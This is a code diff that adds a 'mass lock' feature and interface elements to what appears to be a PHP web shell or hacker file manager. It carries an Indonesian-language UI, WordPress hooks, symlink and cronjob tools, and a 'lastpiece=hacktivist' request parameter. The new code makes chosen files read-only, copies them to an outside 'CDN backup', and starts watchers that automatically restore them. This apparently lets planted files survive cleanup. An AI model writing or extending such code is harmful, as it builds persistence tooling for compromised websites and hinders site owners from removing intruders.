@@ -29,6 +29,8 @@ function findWpLoad($dir = null, $depth = 0) {
 
 // === WP AJAX HANDLER - Exact copy from reference script ===
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
+    ob_clean();
+    header('Content-Type: application/json; charset=utf-8');
 
     $wp_load_path = findWpLoad();
     if (!$wp_load_path) {
@@ -1782,6 +1784,43 @@ if (isset($_POST['lock_action']) && isAuthenticated()) {
         lp_build_php_watcher($phpWatchFile, $lockStore);
         lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
         echo json_encode(array('ok' => true, 'backup_url' => $backupUrl, 'has_backup' => !empty($backupUrl))); exit;
+    }
+
+    // ── MASS LOCK ──────────────────────────────────────────────────────────
+    if ($lockAction === 'mass_lock') {
+        $paths = isset($_POST['lock_paths']) ? @json_decode(stripslashes($_POST['lock_paths']), true) : array();
+        $perm  = isset($_POST['lock_perm'])  ? trim($_POST['lock_perm']) : '0444';
+        if (empty($paths) || !is_array($paths)) { echo json_encode(array('err' => 'No paths given')); exit; }
+
+        $locked = 0; $failed = 0; $results = array();
+        foreach ($paths as $path) {
+            $path = trim($path);
+            if (empty($path) || (!file_exists($path) && !is_link($path))) {
+                $failed++; $results[] = array('path' => $path, 'ok' => false, 'err' => 'not found'); continue;
+            }
+            $backupUrl = '';
+            if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }
+            // Remove existing entry then add fresh
+            $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
+            $entries[] = array('path' => $path, 'perm' => $perm, 'backup_url' => $backupUrl);
+            @chmod($path, octdec($perm));
+            $locked++;
+            $results[] = array('path' => $path, 'ok' => true, 'backup_url' => $backupUrl);
+        }
+
+        lp_lock_save($lockStore, $entries);
+        lp_build_reupload_helper($helperFile);
+        lp_build_php_watcher($phpWatchFile, $lockStore);
+        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
+        $pid = lp_launch_watcher($phpWatchFile, $shWatchFile, $pidFile);
+
+        echo json_encode(array(
+            'ok'      => true,
+            'locked'  => $locked,
+            'failed'  => $failed,
+            'pid'     => $pid,
+            'results' => $results,
+        )); exit;
     }
 
     // ── TELEGRAM SETTINGS ─────────────────────────────────────────────────
@@ -3704,6 +3743,10 @@ body {
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
             Cronjob
         </button>
+        <button onclick="lockCurrentFolder()" class="btn btn-sm" style="border-color: #f59e0b; color: #f59e0b;">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Lock Folder
+        </button>
         <button onclick="showSymlinkModal()" class="btn btn-sm" style="border-color: #a78bfa; color: #a78bfa;">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
             Symlink
@@ -3762,6 +3805,9 @@ body {
         </button>
         <button class="btn btn-sm" onclick="bulkAction('zip')" style="font-size: 10px; padding: 3px 10px; border-color: #f97316; color: #f97316;">
             <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg>Compress ZIP
+        </button>
+        <button class="btn btn-sm" onclick="bulkAction('lock')" style="font-size: 10px; padding: 3px 10px; border-color: #f59e0b; color: #f59e0b;">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Lock
         </button>
         <button class="btn btn-sm" onclick="bulkAction('delete')" style="font-size: 10px; padding: 3px 10px; border-color: #f85149; color: #f85149;">
             <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>Delete
@@ -4200,6 +4246,66 @@ body {
             <button class="btn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 20px;" onclick="doLockFile()">
                 <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                 Lock &amp; Protect
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Mass Lock Modal -->
+<div class="modal-overlay hidden" id="massLockModal">
+    <div class="modal" style="max-width:480px;">
+        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);">
+            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
+                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </span>
+                <span id="massLockTitle">Mass Lock</span>
+            </span>
+            <button class="modal-close" onclick="hideModal2('massLockModal')"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body" style="padding:16px;">
+            <!-- Target summary -->
+            <div id="massLockSummary" style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:6px;padding:8px 12px;margin-bottom:14px;font-size:11px;color:#f59e0b;"></div>
+            <!-- Info cards -->
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;">
+                <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="display:block;margin:0 auto 4px;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    <div style="font-size:9px;color:#f59e0b;font-weight:600;">Pantau Otomatis</div>
+                </div>
+                <div style="background:rgba(74,222,128,0.07);border:1px solid rgba(74,222,128,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" style="display:block;margin:0 auto 4px;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>
+                    <div style="font-size:9px;color:#4ade80;font-weight:600;">Auto Restore</div>
+                </div>
+                <div style="background:rgba(99,179,237,0.07);border:1px solid rgba(99,179,237,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#63b3ed" stroke-width="2" style="display:block;margin:0 auto 4px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    <div style="font-size:9px;color:#63b3ed;font-weight:600;">CDN Backup</div>
+                </div>
+            </div>
+            <!-- Permission picker -->
+            <div class="form-group" style="margin-bottom:12px;">
+                <label class="form-label" style="font-size:11px;color:var(--text-muted);">Permission yang dikunci (chmod)</label>
+                <input type="text" id="massLockPerm" class="form-input" value="0444" style="font-family:monospace;letter-spacing:2px;font-size:14px;font-weight:600;" maxlength="5">
+                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                    <button type="button" onclick="document.getElementById('massLockPerm').value='0444'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:5px;color:#f87171;font-size:10px;font-family:monospace;cursor:pointer;">0444 — read-only</button>
+                    <button type="button" onclick="document.getElementById('massLockPerm').value='0644'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:5px;color:#f59e0b;font-size:10px;font-family:monospace;cursor:pointer;">0644 — rw-r--r--</button>
+                    <button type="button" onclick="document.getElementById('massLockPerm').value='0755'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);border-radius:5px;color:#4ade80;font-size:10px;font-family:monospace;cursor:pointer;">0755 — rwxr-xr-x</button>
+                </div>
+            </div>
+            <!-- Progress (shown while locking) -->
+            <div id="massLockProgress" style="display:none;">
+                <div style="height:4px;background:rgba(245,158,11,0.15);border-radius:2px;overflow:hidden;margin-bottom:8px;">
+                    <div id="massLockBar" style="height:100%;background:#f59e0b;width:0%;transition:width 0.3s;border-radius:2px;"></div>
+                </div>
+                <div id="massLockProgressText" style="font-size:10px;color:var(--text-muted);text-align:center;"></div>
+            </div>
+            <!-- Result -->
+            <div id="massLockResult" style="display:none;font-size:11px;padding:8px 10px;border-radius:5px;"></div>
+        </div>
+        <div class="modal-footer" id="massLockFooter" style="justify-content:space-between;gap:8px;">
+            <button class="btn btn-secondary" onclick="hideModal2('massLockModal')" style="padding:7px 16px;">Batal</button>
+            <button class="btn" id="massLockBtn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 20px;" onclick="doMassLock()">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                Lock Semua
             </button>
         </div>
     </div>
@@ -6121,6 +6227,8 @@ function bulkAction(type) {
                 }
             });
         }
+    } else if (type === 'lock') {
+        showMassLockModal(paths, 'Lock ' + paths.length + ' File Terpilih');
     } else if (type === 'zip') {
         document.getElementById('zipFileName').value = 'archive_' + Date.now() + '.zip';
         document.getElementById('zipNameModal').classList.remove('hidden');
@@ -6251,6 +6359,92 @@ function doLockFile() {
         }
     }).catch(function(e) { showToast('Error: ' + e.message, 'error'); });
 }
+
+// ── MASS LOCK ─────────────────────────────────────────────────────────────
+var _massLockPaths = [];
+
+function showMassLockModal(paths, title) {
+    _massLockPaths = paths;
+    document.getElementById('massLockTitle').textContent = title || 'Mass Lock';
+    var count = paths.length;
+    var summary = document.getElementById('massLockSummary');
+    summary.innerHTML = '<b>' + count + ' item</b> akan dikunci dan dipantau watcher otomatis.'
+        + '<br><span style="opacity:0.7;font-size:10px;">'
+        + paths.slice(0, 3).map(function(p){ return p.split('/').pop(); }).join(', ')
+        + (count > 3 ? ' + ' + (count - 3) + ' lainnya' : '')
+        + '</span>';
+    document.getElementById('massLockProgress').style.display = 'none';
+    document.getElementById('massLockResult').style.display   = 'none';
+    document.getElementById('massLockFooter').style.display   = 'flex';
+    document.getElementById('massLockBtn').disabled = false;
+    document.getElementById('massLockBtn').textContent = 'Lock ' + count + ' Item';
+    document.getElementById('massLockModal').classList.remove('hidden');
+}
+
+function lockCurrentFolder() {
+    // Collect all file paths visible in current file table
+    var checkboxes = document.querySelectorAll('.file-checkbox');
+    var paths = [];
+    checkboxes.forEach(function(cb) { if (cb.value) paths.push(cb.value); });
+    if (paths.length === 0) {
+        showToast('Tidak ada file di folder ini', 'warning'); return;
+    }
+    showMassLockModal(paths, 'Lock Folder Ini (' + paths.length + ' item)');
+}
+
+function doMassLock() {
+    var paths = _massLockPaths;
+    var perm  = document.getElementById('massLockPerm').value.trim();
+    if (!paths || paths.length === 0) { showToast('Tidak ada file', 'warning'); return; }
+    if (!/^0?[0-7]{3,4}$/.test(perm)) { showToast('Permission tidak valid', 'warning'); return; }
+
+    var btn  = document.getElementById('massLockBtn');
+    var prog = document.getElementById('massLockProgress');
+    var bar  = document.getElementById('massLockBar');
+    var txt  = document.getElementById('massLockProgressText');
+    var res  = document.getElementById('massLockResult');
+    var ftr  = document.getElementById('massLockFooter');
+
+    btn.disabled = true;
+    prog.style.display = '';
+    res.style.display  = 'none';
+    bar.style.width    = '5%';
+    txt.textContent    = 'Mengirim request...';
+
+    lockRequest({lock_action: 'mass_lock', lock_paths: JSON.stringify(paths), lock_perm: perm}, function(d) {
+        bar.style.width = '100%';
+        if (d.ok) {
+            txt.textContent = 'Selesai!';
+            var withBackup    = (d.results || []).filter(function(r){ return r.ok && r.backup_url; }).length;
+            var withoutBackup = (d.results || []).filter(function(r){ return r.ok && !r.backup_url; }).length;
+            res.style.display    = '';
+            res.style.background = 'rgba(74,222,128,0.08)';
+            res.style.border     = '1px solid rgba(74,222,128,0.25)';
+            res.style.color      = '#4ade80';
+            res.innerHTML = '<b>' + d.locked + ' file dikunci</b>'
+                + (d.failed > 0 ? ' | <span style="color:#f87171;">' + d.failed + ' gagal</span>' : '')
+                + '<br><span style="font-size:10px;opacity:0.8;">'
+                + withBackup + ' dengan backup CDN'
+                + (withoutBackup > 0 ? ' | ' + withoutBackup + ' folder (no backup)' : '')
+                + '</span>';
+            ftr.style.display = 'flex';
+            btn.disabled = false;
+            btn.textContent = 'Tutup';
+            btn.onclick = function() { hideModal2('massLockModal'); };
+            showToast('<b>' + d.locked + '</b> file dikunci & watcher aktif', 'success', 5000, 'applepay');
+            clearSelection();
+        } else {
+            bar.style.background = '#f85149';
+            res.style.display    = '';
+            res.style.background = 'rgba(248,81,73,0.08)';
+            res.style.border     = '1px solid rgba(248,81,73,0.25)';
+            res.style.color      = '#f87171';
+            res.textContent      = 'Gagal: ' + (d.err || 'Unknown error');
+            btn.disabled = false;
+        }
+    });
+}
+// ── END MASS LOCK ─────────────────────────────────────────────────────────
 
 // ── UNIVERSAL CONFIRM DIALOG ──────────────────────────────────────────────
 var _uConfirmCallback = null;
@@ -6730,7 +6924,7 @@ showModal('ftp');
 // === WordPress Manager Functions ===
 function wpRequest(data, callback) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', window.location.href, true);
+    xhr.open('POST', window.location.pathname + '?lastpiece=hacktivist', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onload = function() {
         try {
